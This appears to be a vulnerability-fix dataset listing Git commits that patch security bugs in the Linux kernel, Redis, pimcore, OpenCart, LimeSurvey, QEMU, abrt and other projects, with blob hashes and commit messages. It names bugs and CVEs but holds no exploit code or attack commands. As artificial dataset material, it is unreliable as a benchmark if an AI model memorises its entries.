    236cd48184c2df20e75bc9fee098ded782f2560f
    4fd1d809738c519b676598f698501e7b6dc52080
    5bc71d9a674a7e5dfc3ff882ee61a2591a328c7b
    8d0b3ade0ff0ef8a65f8714330a3bfd49201c0d8
    95cb6970c3eafc87bbe1d10a66481315e3bd3241
    9ae690d4cfeb9b1f078a6ea7f9dc7b25a6288ea0
    aa023283cc8a2967e006fc6d9dbeb17c3a578b39
    aa70035fb4027b2f9688d00578e12b5d66914f9f
    c9b4df5810d52560b084b9557150faf8cfbe6e29
    cbae1ed0b7c17dcb966f7d43ca823fa0dcb357bf
Projects:
    0-T-0_ps4-linux
Commit Message for 23b133bdc452aa441fcb9b82cbf6dd05cfd342d0:
udf: Check length of extended attributes and allocation descriptors\n\nCheck length of extended attributes and allocation descriptors when loading inodes from disk. Otherwise corrupted filesystems could confuse the code and make the kernel oops.\n\nReported-by: Carl Henrik Lunde <chlunde@ping.uio.no> CC: stable@vger.kernel.org Signed-off-by: Jan Kara <jack@suse.cz>

======================================================================
Commit With Fix: 
    cf872776fc84128bb779ce2b83a37c884c3203ae
File(s) In Commit: 
    drivers/tty/tty_ldsem.c
Blob(s) In Commit: 
    d8a55e87877f06f3141602e4f08cdcb668c465b0
Blob(s) Before Fix: 
    0ffb0cbe28237239ffd093877a363c7957c8e328
    22fad8ad5ac206c4cf22f820e9a4cf5c3f6cd8bd
    99514d9fb2578867f71b3ed888e08bc6f6fd8ae0
    ad7eba5ca380fad606a711f79eda67e3b150074a
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for cf872776fc84128bb779ce2b83a37c884c3203ae:
tty: Fix hang at ldsem_down_read()\n\nWhen a controlling tty is being hung up and the hang up is waiting for a just-signalled tty reader or writer to exit, and a new tty reader/writer tries to acquire an ldisc reference concurrently with the ldisc reference release from the signalled reader/writer, the hangup can hang. The new reader/writer is sleeping in ldsem_down_read() and the hangup is sleeping in ldsem_down_write() [1].\n\nThe new reader/writer fails to wakeup the waiting hangup because the wrong lock count value is checked (the old lock count rather than the new lock count) to see if the lock is unowned.\n\nChange helper function to return the new lock count if the cmpxchg was successful  document this behavior.\n\n[1] edited dmesg log from reporter\n\nSysRq : Show Blocked State   task                        PC stack   pid father systemd         D ffff88040c4f0000     0     1      0 0x00000000  ffff88040c49fbe0 0000000000000046 ffff88040c4a0000 ffff88040c49ffd8  00000000001d3980 00000000001d3980 ffff88040c4a0000 ffff88040593d840  ffff88040c49fb40 ffffffff810a4cc0 0000000000000006 0000000000000023 Call Trace:  [<ffffffff810a4cc0>] ? sched_clock_cpu+0x9f/0xe4  [<ffffffff810a4cc0>] ? sched_clock_cpu+0x9f/0xe4  [<ffffffff810a4cc0>] ? sched_clock_cpu+0x9f/0xe4  [<ffffffff810a4cc0>] ? sched_clock_cpu+0x9f/0xe4  [<ffffffff817a6649>] schedule+0x24/0x5e  [<ffffffff817a588b>] schedule_timeout+0x15b/0x1ec  [<ffffffff810a4cc0>] ? sched_clock_cpu+0x9f/0xe4  [<ffffffff817aa691>] ? _raw_spin_unlock_irq+0x24/0x26  [<ffffffff817aa10c>] down_read_failed+0xe3/0x1b9  [<ffffffff817aa26d>] ldsem_down_read+0x8b/0xa5  [<ffffffff8142b5ca>] ? tty_ldisc_ref_wait+0x1b/0x44  [<ffffffff8142b5ca>] tty_ldisc_ref_wait+0x1b/0x44  [<ffffffff81423f5b>] tty_write+0x7d/0x28a  [<ffffffff814241f5>] redirected_tty_write+0x8d/0x98  [<ffffffff81424168>] ? tty_write+0x28a/0x28a  [<ffffffff8115d03f>] do_loop_readv_writev+0x56/0x79  [<ffffffff8115e604>] do_readv_writev+0x1b0/0x1ff  [<ffffffff8116ea0b>] ? do_vfs_ioctl+0x32a/0x489  [<ffffffff81167d9d>] ? final_putname+0x1d/0x3a  [<ffffffff8115e6c7>] vfs_writev+0x2e/0x49  [<ffffffff8115e7d3>] SyS_writev+0x47/0xaa  [<ffffffff817ab822>] system_call_fastpath+0x16/0x1b bash            D ffffffff81c104c0     0  5469   5302 0x00000082  ffff8800cf817ac0 0000000000000046 ffff8804086b22a0 ffff8800cf817fd8  00000000001d3980 00000000001d3980 ffff8804086b22a0 ffff8800cf817a48  000000000000b9a0 ffff8800cf817a78 ffffffff81004675 ffff8800cf817a44 Call Trace:  [<ffffffff81004675>] ? dump_trace+0x165/0x29c  [<ffffffff810a4cc0>] ? sched_clock_cpu+0x9f/0xe4  [<ffffffff8100edda>] ? save_stack_trace+0x26/0x41  [<ffffffff817a6649>] schedule+0x24/0x5e  [<ffffffff817a588b>] schedule_timeout+0x15b/0x1ec  [<ffffffff810a4cc0>] ? sched_clock_cpu+0x9f/0xe4  [<ffffffff817a9f03>] ? down_write_failed+0xa3/0x1c9  [<ffffffff817aa691>] ? _raw_spin_unlock_irq+0x24/0x26  [<ffffffff817a9f0b>] down_write_failed+0xab/0x1c9  [<ffffffff817aa300>] ldsem_down_write+0x79/0xb1  [<ffffffff817aada3>] ? tty_ldisc_lock_pair_timeout+0xa5/0xd9  [<ffffffff817aada3>] tty_ldisc_lock_pair_timeout+0xa5/0xd9  [<ffffffff8142bf33>] tty_ldisc_hangup+0xc4/0x218  [<ffffffff81423ab3>] __tty_hangup+0x2e2/0x3ed  [<ffffffff81424a76>] disassociate_ctty+0x63/0x226  [<ffffffff81078aa7>] do_exit+0x79f/0xa11  [<ffffffff81086bdb>] ? get_signal_to_deliver+0x206/0x62f  [<ffffffff810b4bfb>] ? lock_release_holdtime.part.8+0xf/0x16e  [<ffffffff81079b05>] do_group_exit+0x47/0xb5  [<ffffffff81086c16>] get_signal_to_deliver+0x241/0x62f  [<ffffffff810020a7>] do_signal+0x43/0x59d  [<ffffffff810f2af7>] ? __audit_syscall_exit+0x21a/0x2a8  [<ffffffff810b4bfb>] ? lock_release_holdtime.part.8+0xf/0x16e  [<ffffffff81002655>] do_notify_resume+0x54/0x6c  [<ffffffff817abaf8>] int_signal+0x12/0x17\n\nReported-by: Sami Farin <sami.farin@gmail.com> Cc: <stable@vger.kernel.org> # 3.12.x Signed-off-by: Peter Hurley <peter@hurleysoftware.com> Signed-off-by: Greg Kroah-Hartman <gregkh@linuxfoundation.org>

======================================================================
Commit With Fix: 
    e0c9c0afd2fc958ffa34b697972721d81df8a56f
File(s) In Commit: 
    fs/namespace.c
Blob(s) In Commit: 
    1f4f9dac6e5af8017e41ab497b92e0515e5ed71c
Blob(s) Before Fix: 
    5b66b2b3624d0da0efe405a6ecb4c86e07a0b58f
    72a286e0d33eb37a2ff3cc8a33f7ca5cefcca266
    82ef1405260e1cfbe551ffba781fec25f881e918
    cd1e9681a0cf5d0bdfd64d84ae90c34bd10f265b
    e8f7f8c58c3c64cacb39629db55262c922797a16
    fbba8b17330d40d4daff7cf61763853cfd414395
Projects:
    0-T-0_ps4-linux
Commit Message for e0c9c0afd2fc958ffa34b697972721d81df8a56f:
mnt: Update detach_mounts to leave mounts connected\n\nNow that it is possible to lazily unmount an entire mount tree and leave the individual mounts connected to each other add a new flag UMOUNT_CONNECTED to umount_tree to force this behavior and use this flag in detach_mounts.\n\nThis closes a bug where the deletion of a file or directory could trigger an unmount and reveal data under a mount point.\n\nCc: stable@vger.kernel.org Signed-off-by: "Eric W. Biederman" <ebiederm@xmission.com>

======================================================================
Commit With Fix: 
    cd4a40174b71acd021877341684d8bb1dc8ea4ae
File(s) In Commit: 
    fs/namespace.c
Blob(s) In Commit: 
    acc5583764dc0925ad2f4745824d3848b743e978
Blob(s) Before Fix: 
    2b12b7a9455d0b60bc6a0498c18264090321a3d1
Projects:
    0-T-0_ps4-linux
Commit Message for cd4a40174b71acd021877341684d8bb1dc8ea4ae:
mnt: Fail collect_mounts when applied to unmounted mounts\n\nThe only users of collect_mounts are in audit_tree.c\n\nIn audit_trim_trees and audit_add_tree_rule the path passed into collect_mounts is generated from kern_path passed an audit_tree pathname which is guaranteed to be an absolute path.   In those cases collect_mounts is obviously intended to work on mounted paths and if a race results in paths that are unmounted when collect_mounts it is reasonable to fail early.\n\nThe paths passed into audit_tag_tree don't have the absolute path check.  But are used to play with fsnotify and otherwise interact with the audit_trees, so again operating only on mounted paths appears reasonable.\n\nAvoid having to worry about what happens when we try and audit unmounted filesystems by restricting collect_mounts to mounts that appear in the mount tree.\n\nSigned-off-by: "Eric W. Biederman" <ebiederm@xmission.com>

======================================================================
Commit With Fix: 
    fdf9d455098f54f7666c702ae464e6ea21e25411
File(s) In Commit: 
    deps/lua/src/ldo.c
Blob(s) In Commit: 
    514f7a2a31f6b9dadbefb7f7983e7a395c4d0643
Blob(s) Before Fix: 
    09089e00d13d4dcf47ccebf87f538a8fd67d4621
    8de05f728e767e2d38ae4adf3d4f35134e16608b
    d1bf786cb7202368755eeba13e3d43b49053b2df
Projects:
    009acc_redis
Commit Message for fdf9d455098f54f7666c702ae464e6ea21e25411:
disable loading lua bytecode

======================================================================
Commit With Fix: 
    976da329ff03ecdfca3030eb6efe3c85e6db9999
File(s) In Commit: 
    lib/bson/object_id.rb
Blob(s) In Commit: 
    b8503f3b4272977a8b74334ba153c5042cc6b42a
Blob(s) Before Fix: 
    d3931446561dfe85c2bfd3a7a26e3cebdf61d905
Projects:
    08_bson-ruby
Commit Message for 976da329ff03ecdfca3030eb6efe3c85e6db9999:
Use \A \z for checking regex on legal

======================================================================
Commit With Fix: 
    4f2a95f877d406a054f9f2253475fe58c76aa03d
File(s) In Commit: 
    pimcore/modules/admin/controllers/AssetController.php
Blob(s) In Commit: 
    e897b8d3fb8bd73679ebacb24252d317eeca1924
Blob(s) Before Fix: 
    fec5d5ba7669ea3614dc81d5b25748236723b0ce
Projects:
    10w042_pimcore
Commit Message for 4f2a95f877d406a054f9f2253475fe58c76aa03d:
AssetController: directory traversal vulnerability issue\n\ngit-svn-id: http://www.pimcore.org/svn/pimcore/private/core/trunk@6458 1f8fe7d8-47f0-464c-8d0a-336f4953ab05

======================================================================
Commit With Fix: 
    1c6692e8287deed7f3356b6a1e2e9b7fe4e858dd
File(s) In Commit: 
    pimcore/modules/admin/controllers/AssetController.php
Blob(s) In Commit: 
    43b1ac91e706203d4f61b333aa769e5333e98a6f
Blob(s) Before Fix: 
    e897b8d3fb8bd73679ebacb24252d317eeca1924
    fec5d5ba7669ea3614dc81d5b25748236723b0ce
Projects:
    10w042_pimcore
Commit Message for 1c6692e8287deed7f3356b6a1e2e9b7fe4e858dd:
fixed sql injection issue\n\ngit-svn-id: http://www.pimcore.org/svn/pimcore/private/core/trunk@6460 1f8fe7d8-47f0-464c-8d0a-336f4953ab05

======================================================================
Commit With Fix: 
    303fa88fe664ded4bf8753b997abd916f0a3c03f
File(s) In Commit: 
    upload/catalog/controller/account/address.php
Blob(s) In Commit: 
    a84f99fdaa714546df5966ad355899371978bc08
Blob(s) Before Fix: 
    1f2cb921689ad991450f8a7b1a01c5ee233ffa69
    bc5be8eb24f7712db808f5b80eb28f105aec92a9
    f1628ec660829850ea48591be49bfd812ed62972
Projects:
    0xhacking_opencart-1
Commit Message for 303fa88fe664ded4bf8753b997abd916f0a3c03f:
Fixed low risk XSS issue with user account address edit. Thanks to @robert81 for the find.\n\nClose #3721

======================================================================
Commit With Fix: 
    ce40cd3fc7fa40a6119e5fe6c0f2bc0eb4541009
File(s) In Commit: 
    arch/x86/kvm/lapic.h
Blob(s) In Commit: 
    9d8fcde52027123fe867559b7deff5ffd67bc080
Blob(s) Before Fix: 
    24f1d46460f2ea985ad2619dae8925a9ac5db039
    6a11845fd8b94435a383823a1e559ba153dbaaca
    71b150cae5f95f42d337057b9b7ed164a58d35ad
    9d28383fc1e70cc3437ae2eb062ff9433c659f96
Projects:
    0-T-0_ps4-linux
Commit Message for ce40cd3fc7fa40a6119e5fe6c0f2bc0eb4541009:
kvm: x86: fix kvm_apic_has_events to check for NULL pointer\n\nMalicious (or egregiously buggy) userspace can trigger it, but it should never happen in normal operation.\n\nSigned-off-by: Paolo Bonzini <pbonzini@redhat.com>

======================================================================
Commit With Fix: 
    3f7352bf21f8fd7ba3e2fcef9488756f188e12be
File(s) In Commit: 
    arch/x86/net/bpf_jit_comp.c
Blob(s) In Commit: 
    ddeff4844a100de83b52ef9dae9f42974666dc23
Blob(s) Before Fix: 
    0c966fecfb8c900b59d3038a28aea840000cce48
    1f7ed2ed6ff7260912c31b6ffade370e79544604
    2580cd2e98b1700f2bc048377d431a56dd69eccb
    3f627345d51cbd1a3dd453bb37cc82d7f75d5bb0
    4ed75dd81d052ff96cc832702d174ad4d63bffec
    520d2bd0b9c583de16ce246ffbf938c5c9f48b33
    5479d677f9bed27ae7ad8a4f58b02093d6ffc851
    579a8fd74be07804d983a298641b755526f1cb44
    5c8cb8043c5a2b19df3e524d9d35ee3ec1949cd5
    6d5663a599a7a362756b5bcb6d3ff3e30ee34bae
    70efcd0940f9f34b8649872b5b1ac44853a8e5f0
    75991979f667f1b9e0e320fa47852969d1066983
    79c216aa0e2baaac3a65a43972161922489c4978
    7b65f752c5f8fd79af2c6b4afb342988bdd8d56c
    82003a36ad96782ce4c064e3ee4824a2052b86ac
    95f9934e805096e939ffc9b5671ecded9f2d2ab2
    987514396c1e443376bffe70e050b72f86509102
    99bef86ed6dffe48490cf49a383c19ff8ad72287
    99f76103c6b733e3d587652e3ab4228d20d57ac9
    bfab3fa10edc63e50b4184d00e75566678242a0d
    d11a47099d330d1dcdc21261df571212551f3f03
Projects:
    0-T-0_ps4-linux
Commit Message for 3f7352bf21f8fd7ba3e2fcef9488756f188e12be:
x86: bpf_jit: fix compilation of large bpf programs\n\nx86 has variable length encoding. x86 JIT compiler is trying to pick the shortest encoding for given bpf instruction. While doing so the jump targets are changing, so JIT is doing multiple passes over the program. Typical program needs 3 passes. Some very short programs converge with 2 passes. Large programs may need 4 or 5. But specially crafted bpf programs may hit the pass limit and if the program converges on the last iteration the JIT compiler will be producing an image full of 'int 3' insns. Fix this corner case by doing final iteration over bpf program.\n\nFixes: 0a14842f5a3c ("net: filter: Just In Time compiler for x86-64") Reported-by: Daniel Borkmann <daniel@iogearbox.net> Signed-off-by: Alexei Starovoitov <ast@plumgrid.com> Tested-by: Daniel Borkmann <daniel@iogearbox.net> Acked-by: Daniel Borkmann <daniel@iogearbox.net> Signed-off-by: David S. Miller <davem@davemloft.net>

======================================================================
Commit With Fix: 
    65d717415a271242b9a30a5330d4eabac1c1a837
File(s) In Commit: 
    application/controllers/admin/dataentry.php
Blob(s) In Commit: 
    35ed84c1202f23dddd92da7eeda8323db7bd436d
Blob(s) Before Fix: 
    d6d623ccdbfda208bb3a2b6f577b5ef159e820a3
Projects:
    3limin4t0r_LimeSurvey
Commit Message for 65d717415a271242b9a30a5330d4eabac1c1a837:
Fixed issue #9720: SQL injection vulnerability in data entry

======================================================================
Commit With Fix: 
    48900cb6af4282fa0fb6ff4d72a81aa3dadb5c39
File(s) In Commit: 
    drivers/net/virtio_net.c
Blob(s) In Commit: 
    237f8e5e493ddaae958684e8ed411c6f7f2363d6
Blob(s) Before Fix: 
    0e2a19e589238ef3dcdd04cd7c691095385c9173
    1568aedddfc9448a462641e198cc538e67b77808
    3d2a90a626498d20c96ba7729beacec16b9b5040
    59b0e9754ae39cbc38812d407688f66f5e79b539
    63c7810e1545a357eda7578af862ed18322de933
    64ca961bca18518f9d6bd7bd4fb92c9213ff526a
    6ac04e2bff07588cd09c3c66a8af3f35ae6acdca
    76fe14efb2b52910c3e113dd0f8917f22c9661b6
    7d9f84a91f37dd96fbd835d170dc8ed24c281b6c
    7fbca37a1adffe5d46d3603e9fd44d4dbd16d331
    8a852b5f215f1c5b3b42c3bc93cf6655a1178b68
    a0c05e07feeb7d8ae7d020291342d4f2c2a7ba78
    b8bd7191572dca25315c71558b434902720a63cc
    d8838dedb7a4cd06f54e2fa8a522b6c4bb15091e
    f1ff3666f090d886e6b8ecc99bc6ac09d8687ef6
Projects:
    0-T-0_ps4-linux
Commit Message for 48900cb6af4282fa0fb6ff4d72a81aa3dadb5c39:
virtio-net: drop NETIF_F_FRAGLIST\n\nvirtio declares support for NETIF_F_FRAGLIST, but assumes that there are at most MAX_SKB_FRAGS + 2 fragments which isn't always true with a fraglist.\n\nA longer fraglist in the skb will make the call to skb_to_sgvec overflow the sg array, leading to memory corruption.\n\nDrop NETIF_F_FRAGLIST so we only get what we can handle.\n\nCc: Michael S. Tsirkin <mst@redhat.com> Signed-off-by: Jason Wang <jasowang@redhat.com> Acked-by: Michael S. Tsirkin <mst@redhat.com> Signed-off-by: David S. Miller <davem@davemloft.net>

======================================================================
Commit With Fix: 
    9b6e6a8334d56354853f9c255d1395c2ba570e0a
File(s) In Commit: 
    arch/x86/entry/entry_64.S
Blob(s) In Commit: 
    8668bbdd2bcac4792fdfe73f9e3181549a92f7fb
Blob(s) Before Fix: 
    062feb4eb47840166b742bdeeac9da603b361a6a
Projects:
    0-T-0_ps4-linux
Commit Message for 9b6e6a8334d56354853f9c255d1395c2ba570e0a:
x86/nmi/64: Switch stacks on userspace NMI entry\n\nReturning to userspace is tricky: IRET can fail, and ESPFIX can rearrange the stack prior to IRET.\n\nThe NMI nesting fixup relies on a precise stack layout and atomic IRET.  Rather than trying to teach the NMI nesting fixup to handle ESPFIX and failed IRET, punt: run NMIs that came from user mode on the normal kernel stack.\n\nThis will make some nested NMIs visible to C code, but the C code is okay with that.\n\nAs a side effect, this should speed up perf: it eliminates an RDMSR when NMIs come from user mode.\n\nSigned-off-by: Andy Lutomirski <luto@kernel.org> Reviewed-by: Steven Rostedt <rostedt@goodmis.org> Reviewed-by: Borislav Petkov <bp@suse.de> Cc: Linus Torvalds <torvalds@linux-foundation.org> Cc: Peter Zijlstra <peterz@infradead.org> Cc: Thomas Gleixner <tglx@linutronix.de> Cc: stable@vger.kernel.org Signed-off-by: Ingo Molnar <mingo@kernel.org>

======================================================================
Commit With Fix: 
    f274aa6787cb8b3ec1cc12c440a56665b7231882
File(s) In Commit: 
    kdcproxy/__init__.py
Blob(s) In Commit: 
    9fc1418766308b8daa5efad151c265cc5d4d699f
Blob(s) Before Fix: 
    865abac7a77788de136b41cfae0f7f78d654dbfb
Projects:
    mark7_kdcproxy
Commit Message for f274aa6787cb8b3ec1cc12c440a56665b7231882:
Enforce a maximum packet length\n\nPermanently fixes CVE-2015-5159 for all applications.

======================================================================
Commit With Fix: 
    df5d2867e8004e51e18b89865bc4aa69229227b3
File(s) In Commit: 
    src/libjasper/mif/mif_cod.c
Blob(s) In Commit: 
    5afc0a249ba700ab337e47ef56ead0114cfc5385
Blob(s) Before Fix: 
    17506a1482ac729c1dfeb4074919dd8cf833750b
Projects:
    did-g_jasper
Commit Message for df5d2867e8004e51e18b89865bc4aa69229227b3:
CVE-2015-5221

======================================================================
Commit With Fix: 
    f9a70e79391f6d7c2a912d785239ee8effc1922d
File(s) In Commit: 
    ui/vnc.c
Blob(s) In Commit: 
    19ce988f5509c4fc4d98e50879c8555d78fd6022
Blob(s) Before Fix: 
    14a86c36ce6625e66e52cc9728bafa5f24a0e530
Projects:
    0-T-0_docker
    0-T-0_ps4-linux
    01hyang_qemu
Commit Message for f9a70e79391f6d7c2a912d785239ee8effc1922d:
ui/vnc: limit client_cut_text msg payload size\n\ncurrently a malicious client could define a payload size of 2^32 - 1 bytes and send up to that size of data to the vnc server. The server would allocated that amount of memory which could easily create an out of memory condition.\n\nThis patch limits the payload size to 1MB max.\n\nPlease note that client_cut_text messages are currently silently ignored.\n\nSigned-off-by: Peter Lieven <pl@kamp.de> Signed-off-by: Gerd Hoffmann <kraxel@redhat.com>

======================================================================
Commit With Fix: 
    cbb4be652d374f64661137756b8f357a1827d6a4
File(s) In Commit: 
    drivers/usb/serial/whiteheat.c
Blob(s) In Commit: 
    d3ea90bef84d98a67f110f6040ca70ec12b7a5fb
Blob(s) Before Fix: 
    1093d2eb046ad06a02e4082fe0c1656fc953f332
    1c7b46a8620cc039847bcdbbb814f76576a53e41
    345211f1a4915a180e7a5386e583b522b0c2a264
    347caad47a121d3f7a26ec7f3246a6960114ffc2
    36a7740e827c997ebbc156bfcb6e908cb02d1804
    407e23c87946b8ad8e67afa6ec17b6a24a14b53f
    473635e7f5dbdf8bb4c28c20102f12b438b31d77
    55cebc1e6fec1d6a2664e2d796c49e2af728af75
    5ab65eb1dacc8b5aa2fdf5152df2a381180683c2
    5b073bcc807b3a9557c07409cb81b457310fae98
    69fec1a99b3e79a886861a72af15b39f2fc426a3
    6c3734d2b45a7a9ca24557a586ba10135b7cadb3
    79314d8c94a446b9378aa7d5ebcb9a533e31cf1e
    7e0acf5c8e38bde7345b3e459f11e352e91739ac
    ae79c2245a7372d28bce2feb76c327bb5b38a38e
    aefd84f88b596c246b1dea2e066c9aa3c21af168
    b9fca3586d741003a50ffb435be7de74020c48e8
    bf7014d49a50ba2d6162b11ba1430ad4bca3acff
    cf3bc30675a1529068c9ee4e2b6d15a4786fbe31
    e62f2dff8b7df6db65e684ef01dbbccced3a6066
Projects:
    0-T-0_ps4-linux
Commit Message for cbb4be652d374f64661137756b8f357a1827d6a4:
USB: whiteheat: fix potential null-deref at probe\n\nFix potential null-pointer dereference at probe by making sure that the required endpoints are present.\n\nThe whiteheat driver assumes there are at least five pairs of bulk endpoints, of which the final pair is used for the "command port". An attempt to bind to an interface with fewer bulk endpoints would currently lead to an oops.\n\nFixes CVE-2015-5257.\n\nReported-by: Moein Ghasemzadeh <moein@istuary.com> Cc: stable <stable@vger.kernel.org> Signed-off-by: Johan Hovold <johan@kernel.org> Signed-off-by: Greg Kroah-Hartman <gregkh@linuxfoundation.org>

======================================================================
Commit With Fix: 
    4f3555b217be8723e8045f9816d147b5f684ec57
File(s) In Commit: 
    app/assets/javascripts/hidden_values.js
Blob(s) In Commit: 
    14cff054f055206396f4366f6536ff0d523c5f82
Blob(s) Before Fix: 
    60a1af45a1e04fe768e6c7c9714f6a1afca77496
    818d07a29ea77377cc0e74e8386694a4d5ad748a
Projects:
    0-T-0_foreman
Commit Message for 4f3555b217be8723e8045f9816d147b5f684ec57:
Fixes #11859 - handle HTML in parameters safely when hiding values (CVE-2015-5282)

======================================================================
Commit With Fix: 
    8e2d61e0aed2b7c4ecb35844fe07e0b2b762dee4
File(s) In Commit: 
    net/sctp/protocol.c
Blob(s) In Commit: 
    3d9ea9a48289af7324d2c96d82938dd978634ce5
Blob(s) Before Fix: 
    1099e99a53c485402ddd9c0693ff5cdd707accca
    328492e2256743abbb95b7262231922610ddc433
    3ac604f96da0469360513e57105bbc734ed9e651
    4345790ad3266c353eeac5398593c2a9ce4effda
    44cbb54c85746a586407015c952e7f8d60ab4d91
    53b7acde9aa37bf3d4029c459421564d5270f4c0
    5942d27b1444c71dc4c7af0c591ec3b1b181a92d
    59e80356672bdf89777265ae1f8c384792dfb98c
    6789d785e698325afc7c8cfd65d1b69c2e50047a
    8f34b27d5775f053ffde8a763f724c0d8b4f6e1f
    b7143337e4fa025fdb473732fdc064503e731dd4
    dc030efa4447e0c38305dc07e68614af221ed98e
    e13c3c3ea4ac10629c3d23090d0db802bc3028a0
    eaee00c61139b974572e8c4aed425176f3ae2894
Projects:
    0-T-0_ps4-linux
Commit Message for 8e2d61e0aed2b7c4ecb35844fe07e0b2b762dee4:
sctp: fix race on protocol/netns initialization\n\nConsider sctp module is unloaded and is being requested because an user is creating a sctp socket.\n\nDuring initialization, sctp will add the new protocol type and then initialize pernet subsys:\n\n        status = sctp_v4_protosw_init()          if (status)                 goto err_protosw_init \n\n        status = sctp_v6_protosw_init()          if (status)                 goto err_v6_protosw_init \n\n        status = register_pernet_subsys(&sctp_net_ops) \n\nThe problem is that after those calls to sctp_v{4,6}_protosw_init(), it is possible for userspace to create SCTP sockets like if the module is already fully loaded. If that happens, one of the possible effects is that we will have readers for net->sctp.local_addr_list list earlier than expected and sctp_net_init() does not take precautions while dealing with that list, leading to a potential panic but not limited to that, as sctp_sock_init() will copy a bunch of blank/partially initialized values from net->sctp.\n\nThe race happens like this:\n\n     CPU 0                           |  CPU 1   socket()                           |    __sock_create                     | socket()     inet_create                      |  __sock_create      list_for_each_entry_rcu(        |         answer, &inetsw[sock->type], |         list) {                      |   inet_create       /* no hits */                  |      if (unlikely(err)) {            |       ...                            |       request_module()               |       /* socket creation is blocked  |        * the module is fully loaded  |        */                            |        sctp_init                     |         sctp_v4_protosw_init         |          inet_register_protosw       |           list_add_rcu(&p->list,     |                        last_perm)    |                                      |  list_for_each_entry_rcu(                                      |     answer, &inetsw[sock->type],         sctp_v6_protosw_init         |     list) {                                      |     /* hit, so assumes protocol                                      |      * is already loaded                                      |      */                                      |  /* socket creation continues                                      |   * before netns is initialized                                      |   */         register_pernet_subsys       |\n\nSimply inverting the initialization order between register_pernet_subsys() and sctp_v4_protosw_init() is not possible because register_pernet_subsys() will create a control sctp socket, so the protocol must be already visible by then. Deferring the socket creation to a work-queue is not good specially because we loose the ability to handle its errors.\n\nSo, as suggested by Vlad, the fix is to split netns initialization in two moments: defaults and control socket, so that the defaults are already loaded by when we register the protocol, while control socket initialization is kept at the same moment it is today.\n\nFixes: 4db67e808640 ("sctp: Make the address lists per network namespace") Signed-off-by: Vlad Yasevich <vyasevich@gmail.com> Signed-off-by: Marcelo Ricardo Leitner <marcelo.leitner@gmail.com> Signed-off-by: David S. Miller <davem@davemloft.net>

======================================================================
Commit With Fix: 
    3c1b60cfa62d39e5fff5a53a5bc53dae189e740e
File(s) In Commit: 
    src/hooks/abrt-hook-ccpp.c
Blob(s) In Commit: 
    58d9c28d20a2534cb92eea1dbb19069064393751
Blob(s) Before Fix: 
    4a31b8103e6b3f2772e7fe71bc269faa776d3f47
Projects:
    AlexxNica_abrt
Commit Message for 3c1b60cfa62d39e5fff5a53a5bc53dae189e740e:
ccpp: save abrt core files only to new files\n\nPrior this commit abrt-hook-ccpp saved a core file generated by a process running a program whose name starts with "abrt" in DUMP_LOCATION/$(basename program)-coredump. If the file was a symlink, the hook followed and wrote core file to the symlink's target.\n\nAddresses CVE-2015-5287\n\nSigned-off-by: Jakub Filak <jfilak@redhat.com>

======================================================================
Commit With Fix: 
    257578a23d1537a2d235aaa2b1488ee4f818e360
File(s) In Commit: 
    src/gui-wizard-gtk/wizard.c
Blob(s) In Commit: 
    2d8d6bab24d006dd146f866fc6723e6dd86d3790
Blob(s) Before Fix: 
    55a4b586f55b6550c920b8ebe7b42408cca507dd
Projects:
    AlexxNica_abrt
Commit Message for 257578a23d1537a2d235aaa2b1488ee4f818e360:
wizard: fix save users changes after reviewing dump dir files\n\nIf the user reviewed the dump dir's files during reporting the crash, the changes was thrown away and original data was passed to the bugzilla bug report.\n\nreport-gtk saves the first text view buffer and then reloads data from the reported problem directory, which causes that the changes made to those text views are thrown away.\n\nFunction save_text_if_changed(), except of saving text, also reload the files from dump dir and update gui state from the dump dir. The commit moves the reloading and updating gui functions away from this function.\n\nRelated to rhbz#1270235\n\nSigned-off-by: Matej Habrnal <mhabrnal@redhat.com>

======================================================================
Commit With Fix: 
    cb1845743bd11ba74a49b6b522c080df86a17d51
File(s) In Commit: 
    admin/filebrowser.php
Blob(s) In Commit: 
    4ad2719586e9eb3d089530fa4ede9eb14ed3a0f2
Blob(s) Before Fix: 
    aac2e2ebdcd7f2804621fff5df3bc605be85922e
    f1ef74c8cd2824be8ced00aa9090b1d89cec6098
Projects:
    1nv4d3r5_GetSimpleCMS
Commit Message for cb1845743bd11ba74a49b6b522c080df86a17d51:
fix #1059

======================================================================
Commit With Fix: 
    89d7cbcd3697c8a842f1a61b99e9a78f295798fb
File(s) In Commit: 
    app/views/events/_menu.html.erb
Blob(s) In Commit: 
    9494e5fccd078b8ae0f5b070efb5c3386a799b14
Blob(s) Before Fix: 
    e12a137ecc6053c303902213e916688a439ac41c
Projects:
    AllenRDCo_snorby
Commit Message for 89d7cbcd3697c8a842f1a61b99e9a78f295798fb:
Fixed xss issue

======================================================================
Commit With Fix: 
    150e3e6d851acb31a0b15ce93380a7dab14203fa
File(s) In Commit: 
    eventapp/lib/gcloud.rb
Blob(s) In Commit: 
    c225e0221091dd0007039c954985649a75d8f7f8
Blob(s) Before Fix: 
    c2895e9d4fc5236cecc333ff663ecbd4e03f6d7e
Projects:
    ingtk_isucon5-qualify
Commit Message for 150e3e6d851acb31a0b15ce93380a7dab14203fa:
Merge pull request #5 from sorah/osci\n\neventapp: Use array to pass arguments

======================================================================
Commit With Fix: 
    e809ea80e3527e32c40756eddd8b2ae44bc3af1a
File(s) In Commit: 
    lazy_bdecode.cpp
Blob(s) In Commit: 
    fe6cb6723ccb2e81f1e37d75e798823f01e0bf21
Blob(s) Before Fix: 
    0f7b292ac43ad77df8993c76d86418973e26dd16
Projects:
    jjpe_bootstrap-dht
Commit Message for e809ea80e3527e32c40756eddd8b2ae44bc3af1a:
Check for out-of-bounds bencoded lengths before advancing buffer pointer

======================================================================
Commit With Fix: 
    b6878d9e03043695dbf3fa1caa6dfc09db225b16
File(s) In Commit: 
    drivers/md/md.c
Blob(s) In Commit: 
    e25f00f0138a7b4d82a5ae4f6fc7e1b6f0bb1b30
Blob(s) Before Fix: 
    0c2a4e8b873c659dbc260b2aa5484c7a5e87b176
    0c699709f13042c3b138eb9b84f8ca6cb7d5ff01
    2382cfc9bb3f55a40489a01cb1d31668ff6725bd
    32fc19c540d426a95f11ace984db7195e34a870c
    4dbed4a67aaf40e3c04bde925870c24d13cd1b4e
    593a02476c781a2b5ee7e491b9188a108630b506
    6df86585100e2e9dca0f32e52996b8858daa8ad1
    709755fb6d7b62823d2291c99397ca0111adcbaf
    717daad71fb101b2b97efd03b1bb41d8b35ecfe7
    c8d2bac4e28be4a65edb63d613b0336b7ff35783
    d429c30cd51471c26cb1c07cb3e6a413106133d4
    d4f31e195e26ebcc4233c9b333624d8b73191826
